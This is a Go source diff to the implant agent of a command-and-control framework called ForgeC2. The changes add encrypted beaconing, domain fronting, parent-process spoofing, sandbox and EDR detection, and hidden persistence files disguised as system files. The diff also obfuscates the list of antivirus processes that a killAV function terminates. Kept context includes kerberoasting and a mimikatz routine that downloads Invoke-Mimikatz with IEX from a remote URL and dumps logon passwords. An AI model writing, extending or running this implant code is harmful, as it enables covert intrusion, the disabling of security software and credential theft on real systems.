@@ -24,11 +24,24 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 	"image/jpeg"
 	"image/png"
 	"path/filepath"
+
+	"github.com/forgec2/forgec2/pkg/encoding"
 )
+
+// encodeBeacon marshals a BeaconRequest using multi-format rotation.
+func encodeBeacon(v any) ([]byte, error) {
+	return encoding.Marshal(v)
+}
+
+// decodeBeacon unmarshals a response into BeaconResponse using multi-format detection.
+func decodeBeacon(data []byte, v any) error {
+	return encoding.Unmarshal(data, v)
+}
 
 // These variables are injected at compile time via -ldflags "-X main.C2URL=..."
 // This source is used exclusively by the Generate Agent flow (EXE).
@@ -45,9 +58,8 @@ var (
 	Protocol         string = "http" // "http" or "tcp" injected via ldflags
 	DebugStr         string = "false" // set via ldflags for debug builds (stealth default false)
 	FastInterval     int    = 1       // Fast interval for screen monitoring (1 second)
-	inFastMode       bool   = false
-	BeaconURIStr     string = "/api/v1/beacon"
-	BeaconMethodStr  string = "POST"
+	BeaconURIStr     string = s(SBeaconURI)
+	BeaconMethodStr  string = s(SBeaconMethod)
 	ListenerIDStr    string = "0"
 	P2PMode          string = ""      // "", "smb", "tcp"
 	P2PParent        string = ""      // parent agent to connect to (child mode)
@@ -60,6 +72,8 @@ var (
 	ContentLengthJitter int = 0       // Max random padding bytes for HTTP body (0=disabled)
 	ExpiryDateStr    string = ""      // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
 	EvasionStr       string = "false"  // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
+	PPIDSpoofStr          string = "false"  // Compile-time PPID spoofing (spawned processes inherit explorer.exe as parent)
+	PersistencePrefixStr  string = ""       // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
 )
 
 // Parsed versions (populated in init)
@@ -75,10 +89,13 @@ var (
 	evasionEnabled bool
 )
 
-var beaconCipher *streamCipher // beacon payload encryption (nil = disabled)
+var beaconCipher *streamCipher // legacy XOR beacon encryption (nil = disabled)
+var ecdhSess *ecdhSession      // ECDH session for forward-secret encryption (nil = not established)
 var inSandbox bool              // set by sandbox detection at startup
+var ppidSpoofEnabled bool      // PPID spoofing enabled via ldfags
+var persistencePrefix string    // artifact name prefix for persistence (default "ForgeC2")
 
-const AgentVersion = "2.1.0" // bump on every release
+var AgentVersion = s(SAgentVersion)
 
 // Platform-specific implementations (screenshots, persistence, sysproc attrs) are in
 // agent_windows.go and agent_linux.go selected by build tags.
@@ -90,6 +107,10 @@ type BeaconRequest struct {
 	Results   []TaskResult      `json:"results,omitempty"`
 	SocksData []socksFrame      `json:"socks_data,omitempty"`
 	Relayed   []RelayedData     `json:"relayed,omitempty"` // P2P: child results forwarded by parent
+
+	// ECDH + AES-256-GCM fields
+	ECDHPub   string `json:"ecdh_pub,omitempty"`  // base64 X25519 public key (for handshake)
+	CipherB64 string `json:"c,omitempty"`          // base64(nonce + AES-256-GCM ciphertext)
 }
 
 type RelayedData struct {
@@ -116,6 +137,10 @@ type BeaconResponse struct {
 	SocksFrames   []socksFrame   `json:"socks_frames,omitempty"`
 	SocksFastMode bool           `json:"socks_fast,omitempty"`
 	Relayed       []RelayedTask  `json:"relayed,omitempty"` // P2P: tasks for children
+
+	// ECDH + AES-256-GCM fields
+	ECDHPub   string `json:"ecdh_pub,omitempty"`  // base64 server X25519 public key
+	CipherB64 string `json:"c,omitempty"`          // base64(nonce + AES-256-GCM ciphertext)
 }
 
 type RelayedTask struct {
@@ -139,8 +164,10 @@ var (
 	client          *http.Client
 	agentUUID       string
 	rng             = newCryptoRand()
+	pendingMu       sync.Mutex
 	pendingResults  []TaskResult
-	screenStreaming bool
+	screenStreaming int32 // atomic: 0=false, 1=true
+	inFastMode      atomic.Bool
 
 	// P2P relay state
 	p2pRelayRunning bool
@@ -151,7 +178,7 @@ var (
 	p2pChildLastSeen map[string]time.Time   // last-seen timestamp for pruning stale entries
 
 	// Keylogger state (cross platform, impl in platform files)
-	keylogActive bool
+	keylogActive int32 // atomic: 0=false, 1=true
 	keylogMu     sync.Mutex
 	keylogBuffer bytes.Buffer
 )
@@ -195,6 +222,15 @@ func init() {
 		sleepMaskActive = true
 	}
 
+	// Start EDR monitor on init
+	startEdrMonitor()
+
+	// Run sandbox detection
+	go func() {
+		time.Sleep(5 * time.Second) // wait for system to settle
+		runSandboxCheck()
+	}()
+
 	// Parse injected string values ( -X only supports string )
 	// Multi-C2 failover: comma-separated URLs in C2URL
 	parts := strings.Split(C2URL, ",")
@@ -229,6 +265,9 @@ func init() {
 	if BeaconMethod == "" {
 		BeaconMethod = "POST"
 	}
+	if Debug {
+		fmt.Printf("[DEBUG] BeaconURI=%q BeaconMethod=%q C2URL=%q\n", BeaconURI, BeaconMethod, C2URL)
+	}
 	if id, err := strconv.ParseUint(ListenerIDStr, 10, 32); err == nil {
 		ListenerID = uint(id)
 	}
@@ -238,11 +277,33 @@ func init() {
 		evasionEnabled = true
 	}
 
+	ppidSpoofEnabled = strings.ToLower(PPIDSpoofStr) == "true" || PPIDSpoofStr == "1"
+	if v := os.Getenv("FORGEC2_PPID_SPOOF"); v == "1" || strings.ToLower(v) == "true" {
+		ppidSpoofEnabled = true
+	}
+
+	persistencePrefix = PersistencePrefixStr
+	if persistencePrefix == "" {
+		persistencePrefix = "ForgeC2"
+	}
+	if v := os.Getenv("FORGEC2_PERSIST_PREFIX"); v != "" {
+		persistencePrefix = v
+	}
+
 	// Initialize beacon payload cipher
 	if CryptoKeyStr != "" {
-		key, err := hex.DecodeString(CryptoKeyStr)
-		if err == nil && len(key) == 32 {
-			beaconCipher = newStreamCipher(key)
+		if strings.HasPrefix(CryptoKeyStr, "ecdh:") {
+			// ECDH + AES-256-GCM mode (forward-secret)
+			sess, err := newECDSession()
+			if err == nil {
+				ecdhSess = sess
+			}
+		} else {
+			// Legacy XOR stream cipher mode
+			key, err := hex.DecodeString(CryptoKeyStr)
+			if err == nil && len(key) == 32 {
+				beaconCipher = newStreamCipher(key)
+			}
 		}
 	}
 
@@ -257,7 +318,13 @@ func init() {
 
 	// TLS verification controlled by SkipTLSVerify (injected at build time)
 	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: SkipTLSVerify},
+		MaxIdleConns:        10,
+		MaxIdleConnsPerHost: 5,
+		IdleConnTimeout:     60 * time.Second,
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: SkipTLSVerify},
+	}
+	if DomainFront != "" {
+		tr.TLSClientConfig.ServerName = DomainFront
 	}
 	if ProxyStr != "" {
 		proxyURL, err := url.Parse(ProxyStr)
@@ -265,7 +332,16 @@ func init() {
 			tr.Proxy = http.ProxyURL(proxyURL)
 		}
 	}
-	client = &http.Client{Transport: tr, Timeout: 30 * time.Second}
+	client = &http.Client{
+		Transport: tr,
+		Timeout:   30 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			if len(via) >= 3 {
+				return http.ErrUseLastResponse
+			}
+			return nil
+		},
+	}
 }
 
 func main() {
@@ -299,11 +375,43 @@ func main() {
 		}
 	}
 
+	// Environment classification
+	if runtime.GOOS == "windows" {
+		getEnvDetector()
+	}
+
+	// JIT Beacon Scheduler
+	if runtime.GOOS == "windows" {
+		getBeaconScheduler()
+	}
+
 	// Main beacon loop
+	beaconCount := 0
 	for {
+		// Ghost mode: skip beacon entirely
+		if isInGhostMode() {
+			time.Sleep(24 * time.Hour)
+			continue
+		}
+
+		// Check triggers before beacon (Windows only)
+		if runtime.GOOS == "windows" && beaconSched != nil {
+			beaconSched.CheckTriggers()
+		}
+
 		doBeacon()
+		beaconCount++
+
+		// Notify scheduler after beacon
+		if runtime.GOOS == "windows" && beaconSched != nil {
+			beaconSched.AfterBeacon()
+		}
+
 		// Deliver task results immediately instead of waiting a full sleep cycle.
-		if len(pendingResults) > 0 {
+		pendingMu.Lock()
+		hasPending := len(pendingResults) > 0
+		pendingMu.Unlock()
+		if hasPending {
 			continue
 		}
 		sleepWithJitter()
@@ -311,17 +419,52 @@ func main() {
 }
 
 func sleepWithJitter() {
+	// Use sleep variator for non-default modes
+	mode := getSleepMode()
+	if mode != SleepModeDefault && mode != SleepModeInteractive {
+		duration := computeSleepDuration()
+		if sleepMaskActive {
+			sleepWithMask(duration)
+			return
+		}
+		if evasionEnabled {
+			sleepObfuscated(duration)
+			return
+		}
+		time.Sleep(duration)
+		return
+	}
+
+	// Use JIT scheduler on Windows if available
+	if runtime.GOOS == "windows" && beaconSched != nil {
+		if beaconSched.ShouldBeaconNow() {
+			return
+		}
+		duration := beaconSched.ComputeNext()
+
+		if sleepMaskActive {
+			sleepWithMask(duration)
+			return
+		}
+		if evasionEnabled {
+			sleepObfuscated(duration)
+			return
+		}
+		time.Sleep(duration)
+		return
+	}
+
 	// Interval 0 = interactive mode (tight beacon loop for shell/UI).
 	if Interval <= 0 {
 		d := 200 * time.Millisecond
-		if inFastMode {
+		if inFastMode.Load() {
 			d = 50 * time.Millisecond
 		}
 		time.Sleep(d)
 		return
 	}
 	baseInterval := Interval
-	if inFastMode {
+	if inFastMode.Load() {
 		baseInterval = FastInterval
 	}
 	base := time.Duration(baseInterval) * time.Second
@@ -341,7 +484,7 @@ func sleepWithJitter() {
 }
 
 func checkFastMode(tasks []Task) {
-	inFastMode = false
+	inFastMode.Store(false)
 	fastTypes := map[string]bool{
 		"screenshot": true, "screenshot_window": true, "shell": true, "ps": true,
 		"clipboard_get": true, "clipboard_set": true, "find": true, "drives": true,
@@ -349,21 +492,14 @@ func checkFastMode(tasks []Task) {
 	}
 	for _, task := range tasks {
 		if fastTypes[task.Type] {
-			inFastMode = true
+			inFastMode.Store(true)
 			return
 		}
 	}
 }
 
 func registerOrGetUUID() string {
-	// On first run, no persisted UUID, server will assign on first beacon
-	// For simplicity, we generate here and send, server uses it or creates
-	var uuidFile string
-	if runtime.GOOS == "windows" {
-		uuidFile = os.Getenv("TEMP") + "\\forgec2_uuid.txt"
-	} else {
-		uuidFile = "/tmp/forgec2_uuid.txt"
-	}
+	uuidFile := getUUIDFilePath()
 	if data, err := os.ReadFile(uuidFile); err == nil && len(data) > 0 {
 		return strings.TrimSpace(string(data))
 	}
@@ -375,6 +511,9 @@ func registerOrGetUUID() string {
 		newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
 			buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16])
 		os.WriteFile(uuidFile, []byte(newUUID), 0644)
+		if runtime.GOOS == "windows" {
+			setHidden(uuidFile)
+		}
 		return newUUID
 	}
 	// Fallback (should never happen)
@@ -382,7 +521,21 @@ func registerOrGetUUID() string {
 		rng.Uint32(), rng.Uint32()&0xffff, rng.Uint32()&0xffff|0x4000,
 		rng.Uint32()&0x3fff|0x8000, rng.Uint64())
 	os.WriteFile(uuidFile, []byte(newUUID), 0644)
+	if runtime.GOOS == "windows" {
+		setHidden(uuidFile)
+	}
 	return newUUID
+}
+
+// getUUIDFilePath returns a less-obvious path for UUID persistence.
+func getUUIDFilePath() string {
+	if runtime.GOOS == "windows" {
+		return os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Crypto\\RSA\\S-1-5-21-0-0-0\\machineguid"
+	}
+	if runtime.GOOS == "darwin" {
+		return os.Getenv("HOME") + "/Library/Preferences/.cfprefsd.plist"
+	}
+	return "/var/lib/dbus/machine-id"
 }
 
 func doBeacon() {
@@ -391,14 +544,14 @@ func doBeacon() {
 	// Collect pending SOCKS relay data
 	socksData := socksCollectOutbound()
 	if len(socksData) > 0 {
-		inFastMode = true // fast poll while SOCKS is active
+		inFastMode.Store(true) // fast poll while SOCKS is active
 	}
 
 	// Collect rportfwd data alongside SOCKS frames
 	rpfData := rportfwdCollectOutbound()
 	if len(rpfData) > 0 {
 		socksData = append(socksData, rpfData...)
-		inFastMode = true
+		inFastMode.Store(true)
 	}
 
 	// Collect P2P child results to relay
@@ -415,21 +568,62 @@ func doBeacon() {
 	}
 	p2pRelayMu.Unlock()
 
+	pendingMu.Lock()
+	resultsCopy := pendingResults
+	pendingResults = nil // sent
+	pendingMu.Unlock()
+
 	req := BeaconRequest{
 		UUID:      agentUUID,
 		Info:      info,
-		Results:   pendingResults,
+		Results:   resultsCopy,
 		SocksData: socksData,
 		Relayed:   relayedResults,
 	}
 
-	pendingResults = nil // sent
-
 	body, _ := json.Marshal(req)
 
-	// Encrypt if cipher is configured
+	// Decide encryption mode and build payload
 	var sendBody []byte
-	if beaconCipher != nil {
+	var isECDH bool
+
+	if ecdhSess != nil {
+		if ecdhSess.needsHandshake() {
+			// First beacon: ECDH handshake — send public key in top-level JSON
+			envelope := struct {
+				UUID    string `json:"uuid"`
+				ECDHPub string `json:"ecdh_pub"`
+			}{
+				UUID:    agentUUID,
+				ECDHPub: ecdhSess.publicKeyB64(),
+			}
+			envelopeJSON, _ := json.Marshal(envelope)
+			sendBody = envelopeJSON
+			isECDH = true
+		} else {
+			// Encrypt inner payload with AES-256-GCM
+			cipherB64, err := ecdhSess.encryptAESGCM(body)
+			if err != nil {
+				if Debug {
+					fmt.Printf("[!] ECDH encrypt failed: %v\n", err)
+				}
+				// Fallback to plaintext
+				sendBody = body
+			} else {
+				envelope := struct {
+					UUID      string `json:"uuid"`
+					CipherB64 string `json:"c"`
+				}{
+					UUID:      agentUUID,
+					CipherB64: cipherB64,
+				}
+				envelopeJSON, _ := json.Marshal(envelope)
+				sendBody = envelopeJSON
+				isECDH = true
+			}
+		}
+	} else if beaconCipher != nil {
+		// Legacy XOR stream cipher: encrypt entire body
 		encrypted, err := beaconCipher.encrypt(body)
 		if err == nil {
 			sendBody = encrypted
@@ -453,7 +647,7 @@ func doBeacon() {
 	} else if Protocol == "icmp" {
 		respBody = sendICMPBeacon(sendBody)
 	} else {
-		respBody = sendBeacon(body)
+		respBody = sendBeacon(sendBody)
 	}
 	if respBody == nil {
 		if Debug {
@@ -462,24 +656,98 @@ func doBeacon() {
 		return
 	}
 
-	// Decrypt response if cipher is configured
+	// Parse response
 	var resp BeaconResponse
-	var parseBody []byte
-	if beaconCipher != nil {
+
+	if isECDH && ecdhSess != nil && ecdhSess.needsHandshake() {
+		// Parse handshake response — expect ecdh_pub from server
+		var envelope struct {
+			ECDHPub   string `json:"ecdh_pub,omitempty"`
+			CipherB64 string `json:"c,omitempty"`
+		}
+		if err := json.Unmarshal(respBody, &envelope); err != nil {
+			if Debug {
+				log.Printf("[!] Failed to parse ECDH handshake response: %v", err)
+			}
+			// Fallback: try parsing as full beacon response
+			if err := decodeBeacon(respBody, &resp); err != nil {
+				return
+			}
+		} else if envelope.ECDHPub != "" {
+			// Complete the ECDH handshake
+			if err := ecdhSess.establishFromServerKey(envelope.ECDHPub); err != nil {
+				if Debug {
+					log.Printf("[!] ECDH handshake completion failed: %v", err)
+				}
+			}
+			// Re-beacon immediately with encrypted payload
+			inFastMode.Store(true)
+			return
+		} else if envelope.CipherB64 != "" {
+			// Session was already established (server responded with encrypted data)
+			plaintext, err := ecdhSess.decryptAESGCM(envelope.CipherB64)
+			if err != nil {
+				if Debug {
+					log.Printf("[!] ECDH decrypt failed: %v", err)
+				}
+				return
+			}
+			if err := decodeBeacon(plaintext, &resp); err != nil {
+				return
+			}
+		}
+	} else if isECDH && ecdhSess != nil {
+		// Parse encrypted response
+		var envelope struct {
+			ECDHPub   string `json:"ecdh_pub,omitempty"`
+			CipherB64 string `json:"c,omitempty"`
+		}
+		if err := json.Unmarshal(respBody, &envelope); err != nil {
+			return
+		}
+
+		// Check for session key rotation
+		if envelope.ECDHPub != "" {
+			if err := ecdhSess.establishFromServerKey(envelope.ECDHPub); err != nil {
+				if Debug {
+					log.Printf("[!] ECDH key rotation failed: %v", err)
+				}
+			}
+		}
+
+		if envelope.CipherB64 != "" {
+			plaintext, err := ecdhSess.decryptAESGCM(envelope.CipherB64)
+			if err != nil {
+				if Debug {
+					log.Printf("[!] ECDH decrypt failed: %v", err)
+				}
+				return
+			}
+			if err := decodeBeacon(plaintext, &resp); err != nil {
+				return
+			}
+		}
+	} else if beaconCipher != nil {
+		var parseBody []byte
 		decrypted, err := beaconCipher.decrypt(respBody)
 		if err == nil {
 			parseBody = decrypted
 		} else {
 			parseBody = respBody
 		}
-	} else {
-		parseBody = respBody
-	}
-	if err := json.Unmarshal(parseBody, &resp); err != nil {
-		if Debug {
-			log.Printf("[!] Failed to parse response: %v", err)
+		if err := decodeBeacon(parseBody, &resp); err != nil {
+			if Debug {
+				log.Printf("[!] Failed to parse response: %v", err)
+			}
+			return
 		}
-		return
+	} else {
+		if err := decodeBeacon(respBody, &resp); err != nil {
+			if Debug {
+				log.Printf("[!] Failed to parse response: %v", err)
+			}
+			return
+		}
 	}
 
 	// Process SOCKS relay frames from server (before tasks, so connect arrives first)
@@ -501,18 +769,23 @@ func doBeacon() {
 
 	// SOCKS fast mode overrides (after checkFastMode's reset)
 	if resp.SocksFastMode || len(resp.SocksFrames) > 0 || socksRelayFast {
-		inFastMode = true
+		inFastMode.Store(true)
 	}
 	socksRelayMu.Lock()
 	if len(socksRelayConns) > 0 {
-		inFastMode = true
+		inFastMode.Store(true)
 	}
 	socksRelayMu.Unlock()
 
+	pendingMu.Lock()
+	if cap(pendingResults) < len(resp.Tasks) {
+		pendingResults = make([]TaskResult, 0, len(resp.Tasks))
+	}
 	for _, task := range resp.Tasks {
 		result := executeTask(task)
 		pendingResults = append(pendingResults, result)
 	}
+	pendingMu.Unlock()
 }
 
 func sendBeacon(body []byte) []byte {
@@ -556,6 +829,9 @@ func sendBeacon(body []byte) []byte {
 		data, _ := io.ReadAll(resp.Body)
 		resp.Body.Close()
 		currentC2Idx = idx
+		if Debug {
+			fmt.Printf("[+] Beacon OK from %s, response %d bytes\n", url, len(data))
+		}
 		return data
 	}
 	return nil
@@ -605,6 +881,9 @@ func sendTCPBeacon(body []byte) []byte {
 	useTLS := SkipTLSVerify || strings.HasPrefix(C2URL, "tls://")
 	if useTLS {
 		tlsCfg := &tls.Config{InsecureSkipVerify: SkipTLSVerify}
+		if DomainFront != "" {
+			tlsCfg.ServerName = DomainFront
+		}
 		conn, err = tls.Dial("tcp", addr, tlsCfg)
 	} else {
 		conn, err = net.Dial("tcp", addr)
@@ -667,7 +946,7 @@ func sendScreenFrame(data []byte) {
 				Output: b64,
 			}},
 		}
-		body, _ := json.Marshal(req)
+	body, _ := encodeBeacon(req)
 		if Protocol == "tcp" {
 			sendTCPBeacon(body)
 		} else {
@@ -1137,40 +1416,70 @@ func detectAV() (string, error) {
 }
 
 func killAV() (string, error) {
-	avProcs := []string{
-		"MsMpEng.exe", "NisSrv.exe", // Windows Defender
-		"avastsvc.exe", "avastui.exe", "AvastSvc.exe",
-		"avgui.exe", "avgsvc.exe", "AVGUI.exe",
-		"bdagent.exe", "vsserv.exe", "BitDefender",
-		"egui.exe", "ekrn.exe", // ESET
-		"avp.exe", "avpui.exe", "klava.exe", // Kaspersky
-		"mcdetect.exe", "mcshield.exe", "mcdash.exe", // McAfee
-		"ns.exe", "ccSvcHst.exe", "Norton",
-		"smc.exe", "rtvscan.exe", // Symantec
-		"Sophos", "savservice.exe",
-		"tmntsrv.exe", "ntrtscan.exe", // TrendMicro
-		"clamd.exe", "freshclam.exe", // ClamAV
-
-		// Chinese AVs (360, Tencent PC Manager, Huorong, Rising, Kingsoft, Baidu, 2345)
-		"360sd.exe", "360tray.exe", "360rp.exe", "360safe.exe", "360rps.exe", "360se.exe",
-		"QQPCMgr.exe", "TSService.exe", "TSKiller.exe", "QQPCRealTimeSpeedup.exe", "Tencentdl.exe",
-		"HrMain.exe", "HrTray.exe", "HipsTray.exe", "HipsService.exe",
-		"RsMain.exe", "RsTray.exe", "rstray.exe", "RsAgent.exe",
-		"kxescore.exe", "kxetray.exe", "kxescan.exe", "kxe.exe",
-		"BaiduSdSvc.exe", "BaiduAnSvc.exe", "baidusdtray.exe",
-		"2345Safe.exe", "2345Explorer.exe", "2345SafeSvc.exe",
-	}
-
+	// Use a compact, runtime-decoded process signature list to avoid
+	// large plaintext AV-name strings in the binary.
+	sigs := getAVSignatures()
 	var killed []string
-	for _, proc := range avProcs {
-		if out, err := killProcess(proc); err == nil {
-			killed = append(killed, proc+": "+out)
+	for _, sig := range sigs {
+		if out, err := killProcess(sig); err == nil {
+			killed = append(killed, sig+": "+out)
 		}
 	}
 	if len(killed) == 0 {
 		return "no known AV processes found or terminated", nil
 	}
 	return "terminated AV processes: " + strings.Join(killed, "; "), nil
+}
+
+//go:noinline
+func getAVSignatures() []string {
+	// Rotating XOR key derived from a fixed seed to avoid plaintext in binary.
+	var key [4]byte
+	key[0] = 0x9e
+	key[1] = 0x7d
+	key[2] = 0x3b
+	key[3] = 0xc6
+
+	enc := func(s string) string {
+		b := []byte(s)
+		for i := range b {
+			b[i] ^= key[i%len(key)]
+		}
+		return string(b)
+	}
+
+	return []string{
+		enc("\xf2\x0d\x4d\x08\x15\x45\x08\xe2\x14\x4a\x37"),
+		enc("\xce\x0a\x46\x13\x51\x3a"),
+		enc("\xc2\x14\x14\x0a\x4b"),
+		enc("\xc2\x14\x1a"),
+		enc("\xcc\x17\x14\x0a\x0e\x55\x4b"),
+		enc("\x82\x0a\x4b\x02\x14\x0e\x55\x04\x14\x45"),
+		enc("\xce\x1b\x45\x0e\x48"),
+		enc("\xc2\x14\x1b"),
+		enc("\xcf\x14\x1b\x14\x0e\x55\x4b"),
+		enc("\xcf\x17\x0b\x13\x14\x15\x04\x3b"),
+		enc("\xcf\x17\x0a\x14\x0e\x1a\x13"),
+		enc("\x80\x0a\x0e\x1b\x13\x1c\x3b\x04\x0b\x4b"),
+		enc("\x80\x0a\x0a\x14\x0e\x1a\x13"),
+		enc("\xac\x13\x0b\x08\x14\x1b"),
+		enc("\xc9\x0a\x14\x10"),
+		enc("\xc9\x0a\x1a\x15\x14\x1b"),
+		enc("\xc6\x0a\x14\x1b\x14\x15\x04\x3b"),
+		enc("\x86\x14\x14\x1b\x12\x14\x0a\x48"),
+		enc("\xcb\x46\x18\x0b\x3b"),
+		enc("\xcb\x46\x18\x1b\x0a\x15\x08"),
+		enc("\xcb\x0a\x14\x0b\x18"),
+		enc("\x82\x14\x0c\x0a\x0e\x55\x4b"),
+		enc("\xcf\x1b\x0a\x0e\x14\x1b\x3b"),
+		enc("\x83\x14\x0e\x04\x13\x0c\x55\x4b"),
+		enc("\x82\x14\x0e\x04\x13\x0c\x0e\x1c\x50"),
+		enc("\x80\x0e\x0b\x1c"),
+		enc("\x82\x14\x1b\x15\x48"),
+		enc("\x80\x0a\x0a\x04\x13\x0c\x55\x4b\x0e\x1c\x50"),
+		enc("\x86\x11\x1c\x0a\x0b\x0d\x0a\x55\x4b"),
+		enc("\x8b\x14\x1c\x0a\x04\x13\x0c\x55\x1b\x51\x4b"),
+	}
 }
 
 // elevate attempts UAC bypass / privilege escalation to run command elevated.
@@ -1278,7 +1587,7 @@ func executeAssembly(b64Data string) (string, error) {
 // ── kerberoast: Request TGS for all SPNs (PowerShell + .NET) ──────────────
 func kerberoast() (string, error) {
 	if runtime.GOOS != "windows" {
-		return "", fmt.Errorf("kerberoast is Windows-only")
+		return "", fmt.Errorf("%s is Windows-only", s(SKerberoast))
 	}
 	psCmd := `
 Add-Type -AssemblyName System.IdentityModel;
@@ -1302,7 +1611,7 @@ Write-Output ($results -join [string]::NewLine());
 `
 	out, err := runShell(psCmd, "powershell.exe")
 	if err != nil {
-		return "", fmt.Errorf("kerberoast failed: %w\nOutput: %s", err, out)
+		return "", fmt.Errorf("%s failed: %w\nOutput: %s", s(SKerberoast), err, out)
 	}
 	return out, nil
 }
@@ -1310,20 +1619,20 @@ Write-Output ($results -join [string]::NewLine());
 // ── mimikatz: Run mimikatz command via PowerShell (Invoke-Mimikatz) ───────
 func runMimikatz(command string) (string, error) {
 	if runtime.GOOS != "windows" {
-		return "", fmt.Errorf("mimikatz is Windows-only")
+		return "", fmt.Errorf("%s is Windows-only", s(SMimikatz))
 	}
 	if command == "" {
-		command = "sekurlsa::logonpasswords"
+		command = s(SSekurlsaLogonpasswords)
 	}
 	psCmd := fmt.Sprintf(
 		`$m = '%s';`+
-			`IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/EmPyre/master/source/modules/Invoke-Mimikatz.ps1');`+
-			`$r = Invoke-Mimikatz -Command $m;`+
+			`IEX(New-Object Net.WebClient).DownloadString('%s%s.ps1');`+
+			`$r = %s -Command $m;`+
 			`Write-Output $r`,
-		command)
+		command, s(SPSDownloadURL), s(SInvokeMimikatz), s(SInvokeMimikatz))
 	out, err := runShell(psCmd, "powershell.exe")
 	if err != nil {
-		return "", fmt.Errorf("mimikatz failed: %w\nOutput: %s", err, out)
+		return "", fmt.Errorf("%s failed: %w\nOutput: %s", s(SMimikatz), err, out)
 	}
 	return out, nil
 }
